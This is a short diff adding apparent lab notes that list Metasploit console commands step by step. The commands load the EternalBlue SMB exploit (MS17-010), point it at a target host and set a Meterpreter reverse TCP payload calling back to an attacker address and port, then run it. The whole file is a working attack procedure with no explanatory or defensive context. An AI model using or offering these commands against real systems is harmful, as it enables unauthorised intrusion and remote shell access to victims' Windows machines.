@@ -1,0 +1,22 @@
+service postgresql start
+msfconsole
+
+search eternalblue
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+options
+
+set rhosts 10.10.0.101
+rhosts => 10.10.0.101
+
+set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+
+set lhost 10.10.0.1
+lhost => 10.10.0.1
+
+set lport 4321
+lport => 4321
+
+run
